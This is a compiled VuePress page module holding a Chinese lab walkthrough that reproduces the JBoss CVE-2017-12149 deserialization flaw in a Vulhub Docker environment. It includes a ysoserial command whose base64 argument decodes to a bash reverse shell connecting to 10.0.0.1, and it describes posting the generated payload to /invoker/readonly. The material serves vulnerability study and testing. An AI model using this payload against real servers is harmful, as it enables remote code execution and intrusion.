import{_ as r}from"./plugin-vue_export-helper-c27b6911.js";import{r as n,o as s,c,a as e,b as a,d as i,e as o}from"./app-58e4a7d6.js";const d={},l=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),h=e("p",null,"该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。",-1),p=e("p",null,"参考：",-1),g={href:"https://mp.weixin.qq.com/s/zUJMt9hdGoz1TEOKy2Cgdg",target:"_blank",rel:"noopener noreferrer"},u={href:"https://access.redhat.com/security/cve/cve-2017-12149",target:"_blank",rel:"noopener noreferrer"},m=o(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub运行测试环境</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>首次执行时会有1~3分钟时间初始化，初始化完成后访问<code>http://your-ip:8080/</code>即可看到JBoss默认页面。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>该漏洞出现在<code>/invoker/readonly</code>请求中，服务器将用户提交的POST内容进行了Java反序列化：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230328155952101.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>所以，我们用常规Java反序列化漏洞测试方法来复现该漏洞。</p><h3 id="编写反弹shell的命令" tabindex="-1"><a class="header-anchor" href="#编写反弹shell的命令" aria-hidden="true">#</a> 编写反弹shell的命令</h3><p>我们使用bash来反弹shell，但由于<code>Runtime.getRuntime().exec()</code>中不能使用管道符等bash需要的方法，我们需要用进行一次编码。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230328160010674.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h3 id="序列化数据生成" tabindex="-1"><a class="header-anchor" href="#序列化数据生成" aria-hidden="true">#</a> 序列化数据生成</h3>`,12),_={href:"https://github.com/frohoff/ysoserial",target:"_blank",rel:"noopener noreferrer"},b=o(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>java -jar ysoserial.jar CommonsCollections5 &quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS8yMSAwPiYx}|{base64,-d}|{bash,-i}&quot; &gt; poc.ser
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="发送poc" tabindex="-1"><a class="header-anchor" href="#发送poc" aria-hidden="true">#</a> 发送POC</h3><p>生成好的POC即为poc.ser，将这个文件作为POST Body发送至/invoker/readonly即可：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230328160034054.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>成功反弹shell：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230328160045518.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,6);function f(x,v){const t=n("ExternalLinkIcon");return s(),c("div",null,[l,h,p,e("ul",null,[e("li",null,[e("a",g,[a("https://mp.weixin.qq.com/s/zUJMt9hdGoz1TEOKy2Cgdg"),i(t)])]),e("li",null,[e("a",u,[a("https://access.redhat.com/security/cve/cve-2017-12149"),i(t)])])]),m,e("p",null,[a("使用"),e("a",_,[a("ysoserial"),i(t)]),a("来复现生成序列化数据，由于Vulhub使用的Java版本较新，所以选择使用的gadget是CommonsCollections5：")]),b])}const C=r(d,[["render",f],["__file","JBoss 5.x6.x 反序列化漏洞 CVE-2017-12149.html.vue"]]);export{C as default};
